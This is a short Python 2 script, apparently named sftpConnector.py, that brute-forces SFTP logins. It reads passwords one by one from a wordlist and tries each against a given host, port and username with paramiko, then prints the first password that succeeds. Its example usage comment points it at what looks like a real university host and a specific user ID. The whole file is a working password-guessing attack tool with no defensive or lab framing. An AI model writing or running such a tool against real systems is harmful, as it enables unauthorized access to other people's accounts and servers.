import paramiko
import sys

#Example usage:
#python sftpConnector.py general.asu.edu 22 cbsims 10k

hostname = sys.argv[1]
port = int(sys.argv[2])
uid = sys.argv[3]
wordlist = sys.argv[4]

print '\n===== SFTP AUTHENTICATOR ====='
print '----- HOST: ' + hostname
print '----- PORT: ', port
print '----- UID: ' + uid
print '----- WORDLIST: ' + wordlist + '\n'

with open(wordlist) as f:
	counter = 0

	for line in f:
		psw = line.strip()
		try:
			client = paramiko.Transport((hostname, port))
			client.connect(username=uid, password=psw)
			sftp = paramiko.SFTPClient.from_transport(client)
			sftp.close()
			client.close()

			print "\n===== FOUND ====="
			print "uid: ", uid
			print "pass: ", psw
			break

		except:
			client.close()
			counter += 1
			print counter, "-", line.strip()



